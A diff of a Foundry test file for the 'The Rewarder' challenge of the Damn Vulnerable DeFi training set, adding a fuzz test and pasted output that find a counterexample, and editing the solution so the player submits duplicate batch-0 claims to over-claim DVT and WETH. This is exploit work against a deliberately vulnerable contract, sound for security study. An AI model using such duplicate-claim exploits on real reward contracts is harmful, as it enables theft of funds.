@@ -117,6 +117,94 @@ contract TheRewarderChallenge is Test {
         vm.stopPrank(); // stop deployer prank
     }
 
+    /*
+    ectario@pwnMachine:~/DamnVulnDefi(master⚡) » forge clean && forge test --match-test testFuzzClaimBitsAsPlayer -vv
+
+    Compiler run successful!
+    proptest: Saving this and future failures in cache/fuzz/failures
+    proptest: If this test was run on a CI system, you may wish to add the following line to your copy of the file. (You may need to create it.)
+    cc 7ce10e5d8657b20c794b21eb08d3d959b55d8fb706cb01c8c87711b4949f533b
+
+    Ran 1 test for test/the-rewarder/TheRewarder.t.sol:TheRewarderChallenge
+    [FAIL: player got too much DVT: 46099055311327528 > 11524763827831882; counterexample: calldata=0x740f7da9000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000003500000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000009000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000a6 args=[[3, 53, 3, 9, 2, 166]]] testFuzzClaimBitsAsPlayer(uint8[]) (runs: 4, μ: 18602387, ~: 20003644)
+    Logs:
+    - Token WETH
+    - Token WETH
+    - Token DVT
+    - Token DVT
+    - Token DVT
+    - Token DVT
+    */
+
+    function testFuzzClaimBitsAsPlayer(uint8[] memory tokensBits) public {
+        vm.assume(tokensBits.length > 0 && tokensBits.length < 20); // lets limit nb claims 
+
+        vm.startPrank(player);
+
+        uint256 count = tokensBits.length;
+        uint256 playerDVTAmount = 11524763827831882; // already deposited (lets see the json) 
+        uint256 playerWETHAmount = 1171088749244340; // already deposited (lets see the json)
+
+        // Load proofs again
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        IERC20[] memory tokens = new IERC20[](2);
+        tokens[0] = IERC20(address(dvt));
+        tokens[1] = IERC20(address(weth));
+
+        // Build claims from the bit pattern
+        Claim[] memory claims = new Claim[](count);
+
+        uint256 bitSourceIndex = 0;
+        uint256 bits = tokensBits[bitSourceIndex];
+        uint256 bitOffset = 0;
+
+        for (uint256 i = 0; i < count; i++) {
+            if (bitOffset >= 8) {
+                bitOffset = 0;
+                bitSourceIndex++;
+                bits = tokensBits[bitSourceIndex];
+            }
+
+            uint8 bit = uint8((bits >> bitOffset) & 1);
+            bitOffset++;
+
+            if (bit == 0) {
+                claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: playerDVTAmount,
+                    tokenIndex: 0,
+                    proof: merkle.getProof(dvtLeaves, 188)
+                });
+            } else {
+                claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: playerWETHAmount,
+                    tokenIndex: 1,
+                    proof: merkle.getProof(wethLeaves, 188)
+                });
+            }
+        }
+
+        try distributor.claimRewards(claims, tokens) {
+            console.log("Claim succeeded with %s claims", count);
+            for (uint256 j = 0; j < claims.length; j++) {
+                console.log(" - Token %s", claims[j].tokenIndex == 0 ? "DVT" : "WETH");
+            }
+        } catch {
+            console.log("Claim reverted with %s claims", count);
+            for (uint256 j = 0; j < claims.length; j++) {
+                console.log(" - Token %s", claims[j].tokenIndex == 0 ? "DVT" : "WETH");
+            }
+        }
+
+        assertLe(dvt.balanceOf(player), playerDVTAmount, "player got too much DVT");
+        assertLe(weth.balanceOf(player), playerWETHAmount, "player got too much WETH");
+
+        vm.stopPrank();
+    }
+
     /**
      * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
      */
@@ -177,25 +265,25 @@ contract TheRewarderChallenge is Test {
             proof: merkle.getProof(dvtLeaves, 188) // player's address is at index 188
         });
 
-        // And then, the WETH claim
-        claims[1] = Claim({
-            batchNumber: 0, // claim corresponds to first WETH batch
-            amount: PLAYER_CLAIM_WETH,
-            tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
-            proof: merkle.getProof(wethLeaves, 188) // player's address is at index 188
-        });
-
         // First, the DVT claim
-        claims[2] = Claim({
-            batchNumber: 1, // claim corresponds to first DVT batch
+        claims[1] = Claim({
+            batchNumber: 0, // claim corresponds to first DVT batch
             amount: PLAYER_CLAIM_DVT,
             tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
             proof: merkle.getProof(dvtLeaves, 188) // player's address is at index 188
         });
 
         // And then, the WETH claim
+        claims[2] = Claim({
+            batchNumber: 0, // claim corresponds to first WETH batch
+            amount: PLAYER_CLAIM_WETH,
+            tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
+            proof: merkle.getProof(wethLeaves, 188) // player's address is at index 188
+        });
+
+        // And then, the WETH claim
         claims[3] = Claim({
-            batchNumber: 1, // claim corresponds to first WETH batch
+            batchNumber: 0, // claim corresponds to first WETH batch
             amount: PLAYER_CLAIM_WETH,
             tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
             proof: merkle.getProof(wethLeaves, 188) // player's address is at index 188
